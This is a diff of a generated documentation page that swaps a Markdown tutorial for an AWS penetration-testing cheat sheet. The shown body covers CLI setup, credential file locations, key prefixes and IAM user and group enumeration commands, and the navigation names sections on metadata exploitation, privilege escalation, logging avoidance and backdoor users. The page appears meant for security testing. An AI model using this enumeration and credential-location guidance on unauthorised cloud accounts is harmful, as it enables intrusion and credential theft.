         <li class="md-nav__item">
-  <a href="#headers" class="md-nav__link">
+  <a href="#cli-configuration-identity" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Headers
+        CLI Configuration &amp; Identity
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="CLI Configuration &amp; Identity">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-aws-cli-setup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic AWS CLI Setup
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#text-formatting" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#identity-verification" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Text formatting
+        Identity Verification
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#links-and-images" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#credential-types" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Links and images
+        Credential Types
       
     </span>
   </a>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
-  <a href="#lists" class="md-nav__link">
+  <a href="#aws-credentials-storage" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Lists
+        AWS Credentials Storage
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AWS Credentials Storage">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#credential-locations" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Locations
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#blockquotes" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#file-structure" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Blockquotes
+        File Structure
       
     </span>
   </a>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
-  <a href="#code-blocks" class="md-nav__link">
+  <a href="#core-services-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Code blocks
+        Core Services Enumeration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Core Services Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#iam-user-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IAM User Enumeration
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#tables" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#iam-group-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Tables
+        IAM Group Enumeration
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#horizontal-rule" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#iam-role-enumeration" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Horizontal rule
+        IAM Role Enumeration
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#task-lists" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#policy-analysis" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Task lists
+        Policy Analysis
       
     </span>
   </a>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
-  <a href="#escaping-characters" class="md-nav__link">
+  <a href="#red-team-operations" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Escaping characters
+        Red Team Operations
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Red Team Operations">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#initial-compromise-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Initial Compromise &amp; Enumeration
       
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#line-breaks" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#instance-metadata-exploitation" class="md-nav__link">
     <span class="md-ellipsis">
       
-        Line breaks
+        Instance Metadata Exploitation
       
     </span>
   </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-configuration-validation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Credential Configuration &amp; Validation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#privilege-escalation-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege Escalation Techniques
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-privilege-escalation-vectors" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Common Privilege Escalation Vectors
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#automated-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Automated Tools
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Automated Tools">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#pacu-aws-exploitation-framework" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Pacu - AWS Exploitation Framework
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#scoutsuite-multi-cloud-security-auditing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ScoutSuite - Multi-Cloud Security Auditing
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cloudbrute-cloud-storage-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CloudBrute - Cloud Storage Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#s3scanner-s3-bucket-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S3Scanner - S3 Bucket Discovery
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#additional-enumeration-commands" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Additional Enumeration Commands
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Additional Enumeration Commands">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#s3-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        S3 Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ec2-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        EC2 Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#lambda-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lambda Enumeration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defense-evasion-persistence" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense Evasion &amp; Persistence
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Defense Evasion &amp; Persistence">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#logging-avoidance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Logging Avoidance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backdoor-users" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Backdoor Users
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-tools-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Useful Tools &amp; Resources
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Useful Tools &amp; Resources">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#command-line-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Command Line Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#security-scanners" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Security Scanners
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#learning-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Learning Resources
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -2382,6 +2980,46 @@
   
 
 
+  <nav class="md-path" aria-label="Navigation" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Cloud Pentest
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
               
               <article class="md-content__inner md-typeset">
                 
@@ -2390,78 +3028,316 @@
   
 
 
-<h1 id="markdown-in-5min">Markdown in 5min<a class="headerlink" href="#markdown-in-5min" title="Permanent link">&para;</a></h1>
-<h2 id="headers">Headers<a class="headerlink" href="#headers" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a># H1 Header
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>## H2 Header
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>### H3 Header
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>#### H4 Header
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>##### H5 Header
-</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>###### H6 Header
+  <h1 id="__skip">AWS</h1>
+
+<h2 id="cli-configuration-identity">CLI Configuration &amp; Identity<a class="headerlink" href="#cli-configuration-identity" title="Permanent link">&para;</a></h2>
+<h3 id="basic-aws-cli-setup">Basic AWS CLI Setup<a class="headerlink" href="#basic-aws-cli-setup" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># Configure AWS CLI with a named profile</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>aws<span class="w"> </span>configure<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="c1"># You&#39;ll be prompted for:</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="c1"># - AWS Access Key ID</span>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># - AWS Secret Access Key</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c1"># - Default region name (e.g., us-east-1)</span>
+</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="c1"># - Default output format (e.g., json, text, table)</span>
 </span></code></pre></div>
-<h2 id="text-formatting">Text formatting<a class="headerlink" href="#text-formatting" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>**bold text**
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>*italic text*
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>***bold and italic***
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>~~strikethrough~~
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>`inline code`
+<h3 id="identity-verification">Identity Verification<a class="headerlink" href="#identity-verification" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Verify current identity and account information</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>aws<span class="w"> </span>sts<span class="w"> </span>get-caller-identity<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c1"># Additional identity context:</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-user<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-account-aliases<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
 </span></code></pre></div>
-<h2 id="links-and-images">Links and images<a class="headerlink" href="#links-and-images" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>[Link text](https://example.com)
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>[Link with title](https://example.com &quot;Hover title&quot;)
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>![Alt text](image.jpg)
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>![Image with title](image.jpg &quot;Image title&quot;)
+<blockquote>
+<p><strong>🔍 PRO TIP:</strong> The <code>get-caller-identity</code> command is your go-to for verifying credentials work without requiring specific IAM permissions.</p>
+</blockquote>
+<h3 id="credential-types">Credential Types<a class="headerlink" href="#credential-types" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>📝 NOTE:</strong> Key prefixes indicate credential type:</p>
+</blockquote>
+<ul>
+<li><strong>ASIA</strong> - Temporary (short-term) security credentials</li>
+<li><strong>AKIA</strong> - Long-term access keys</li>
+<li><strong>AROA</strong> - IAM role temporary credentials</li>
+<li><strong>AGPA</strong> - IAM group temporary credentials</li>
+</ul>
+<h2 id="aws-credentials-storage">AWS Credentials Storage<a class="headerlink" href="#aws-credentials-storage" title="Permanent link">&para;</a></h2>
+<h3 id="credential-locations">Credential Locations<a class="headerlink" href="#credential-locations" title="Permanent link">&para;</a></h3>
+<ul>
+<li><strong>Windows:</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>C:<span class="se">\U</span>sers<span class="se">\[</span>Username<span class="o">]</span><span class="se">\.</span>aws<span class="se">\</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>├──<span class="w"> </span>credentials
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>└──<span class="w"> </span>config
 </span></code></pre></div>
-<h2 id="lists">Lists<a class="headerlink" href="#lists" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Unordered:
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>- Item 1
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>- Item 2
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>  - Nested item
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>
-</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>Ordered:
-</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>1. First item
-</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>2. Second item
-</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>3. Third item
+<p><strong>Linux/macOS:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>/home/<span class="o">[</span>user<span class="o">]</span>/.aws/
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>├──<span class="w"> </span>credentials
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>└──<span class="w"> </span>config
 </span></code></pre></div>
-<h2 id="blockquotes">Blockquotes<a class="headerlink" href="#blockquotes" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>&gt; This is a blockquote
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>&gt; Multiple lines
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>&gt;&gt; Nested quote
+<h3 id="file-structure">File Structure<a class="headerlink" href="#file-structure" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># ~/.aws/credentials</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nv">aws_access_key_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>AKIA...
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="nv">aws_secret_access_key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>...
+</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="nv">aws_session_token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>...<span class="w">  </span><span class="c1"># For temporary credentials</span>
+</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>
+</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="c1"># ~/.aws/config</span>
+</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="o">[</span>profile<span class="w"> </span>profile-name<span class="o">]</span>
+</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="nv">region</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>us-east-1
+</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="nv">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>json
 </span></code></pre></div>
-<h2 id="code-blocks">Code blocks<a class="headerlink" href="#code-blocks" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>```javascript
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>function hello() {
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>  console.log(&quot;Hello, world!&quot;);
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>}
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>```
+<p><strong>⚠️ SECURITY NOTE:</strong> Always set appropriate file permissions:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>chmod<span class="w"> </span><span class="m">600</span><span class="w"> </span>~/.aws/credentials<span class="w"> </span>~/.aws/config
 </span></code></pre></div>
-<h2 id="tables">Tables<a class="headerlink" href="#tables" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>| Header 1 | Header 2 | Header 3 |
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>|----------|----------|----------|
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>| Row 1    | Data     | Data     |
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>| Row 2    | Data     | Data     |
+<h2 id="core-services-enumeration">Core Services Enumeration<a class="headerlink" href="#core-services-enumeration" title="Permanent link">&para;</a></h2>
+<h3 id="iam-user-enumeration">IAM User Enumeration<a class="headerlink" href="#iam-user-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="c1"># List all IAM users</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-users<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="c1"># Get detailed user information</span>
+</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-user<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>user-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>
+</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="c1"># List groups for a specific user</span>
+</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-groups-for-user<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>user-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>
+</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="c1"># Get user policies (both managed and inline)</span>
+</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>user-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-user-policies<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>user-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
+</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="c1"># Get effective permissions for user</span>
+</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>aws<span class="w"> </span>iam<span class="w"> </span>simulate-principal-policy<span class="w"> </span>--policy-source-arn<span class="w"> </span>arn:aws:iam::<span class="o">[</span>account-id<span class="o">]</span>:user/<span class="o">[</span>user-name<span class="o">]</span><span class="w"> </span>--action-names<span class="w"> </span><span class="s2">&quot;iam:*&quot;</span><span class="w"> </span><span class="s2">&quot;s3:*&quot;</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
 </span></code></pre></div>
-<h2 id="horizontal-rule">Horizontal rule<a class="headerlink" href="#horizontal-rule" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>---
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>or
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>***
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>or
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>___
+<h3 id="iam-group-enumeration">IAM Group Enumeration<a class="headerlink" href="#iam-group-enumeration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1"># List all IAM groups</span>
+</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-groups<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>
+</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="c1"># Get group details and members</span>
+</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>aws<span class="w"> </span>iam<span class="w"> </span>get-group<span class="w"> </span>--group-name<span class="w"> </span><span class="o">[</span>group-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="c1"># List group policies</span>
+</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-attached-group-policies<span class="w"> </span>--group-name<span class="w"> </span><span class="o">[</span>group-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
+</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>aws<span class="w"> </span>iam<span class="w"> </span>list-group-policies<span class="w"> </span>--group-name<span class="w"> </span><span class="o">[</span>group-name<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile-name<span class="o">]</span>
 </span></code></pre></div>
-<h2 id="task-lists">Task lists<a class="headerlink" href="#task-lists" title="Permanent link">&para;</a></h2>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>- [x] Completed task
-</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>- [ ] Incomplete task
-</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>- [ ] Another task
+<h3 id="iam-role-enumeration">IAM Role Enumeration<a class="headerlink" href="#iam-role-enumeration" title="Permanent link">&para;</a></h3>
